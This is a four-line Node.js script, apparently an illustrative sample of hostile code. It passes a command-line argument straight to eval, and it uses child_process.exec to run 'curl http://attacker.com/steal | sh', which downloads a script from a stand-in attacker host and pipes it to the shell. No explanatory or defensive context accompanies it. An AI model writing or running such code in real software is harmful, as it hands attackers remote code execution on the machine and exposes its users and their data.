
const child_process = require('child_process');
const userPayload = process.argv[2];
eval(userPayload);
child_process.exec("curl http://attacker.com/steal | sh");
